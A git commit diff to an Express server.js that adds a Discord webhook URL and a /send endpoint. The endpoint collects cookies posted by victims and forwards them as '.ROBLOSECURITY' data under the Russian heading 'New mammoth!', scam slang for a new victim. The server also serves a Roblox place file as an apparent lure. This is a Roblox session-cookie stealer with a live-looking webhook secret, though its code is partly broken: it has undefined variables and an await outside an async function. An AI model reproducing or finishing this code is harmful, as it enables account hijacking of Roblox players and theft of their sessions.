52b39f10ab7c85f76bfc621f35a19e51a9d038e7
Catt3a <169023485+Catt3a@users.noreply.github.com>
2026-07-02 03:33:40 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,3 +1,4 @@
+const { table } = require('console');
 const express = require('express');
 const path = require('path');
 const app = express();
@@ -5,10 +6,31 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 app.use(express.static(path.join(__dirname, 'public')));
 
+const webhookUrl = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6';
 
 app.get('/download', (req, res) => {
   const file = path.join(__dirname, 'public', 'sfa.rbxl'); // <=========================================
   res.download(file);
+});
+
+app.post('/send', (req, res) => {
+    let cookies = req.body;
+    let index = 0;
+    let cookiesArray = []
+    for (const cookie in cookies) {
+        index++;
+        //{"name":"Куки №1","value":"авыпфвы"}
+        let newObject = {"name": `Куки №${index}`,"value":`${cookie}`};
+        cookiesArray.push(newObject);
+    }
+    const response = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: {"content":"Новый мамонт!","embeds":[{"title":"Данные","description":"Файлы .ROBLOSECURITY","color":5814783,"fields":[cookiesArray.concat(", ")]}],"attachments":[]},
+      signal: controller.signal,
+    });
+    clearTimeout(timeout);
+
 });
 
 app.listen(PORT, () => {
